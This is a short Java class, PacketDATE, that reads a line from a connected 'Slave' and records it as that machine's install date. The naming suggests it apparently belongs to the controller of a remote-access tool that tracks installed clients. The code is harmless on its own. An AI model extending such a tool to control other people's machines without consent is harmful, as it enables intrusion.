package com.redpois0n.packets;

import com.redpois0n.Slave;

public class PacketDATE extends Packet {

	@Override
	public void read(Slave slave, String line) throws Exception {
		String date = slave.readLine();
		slave.setInstallDate(date);
	}

}
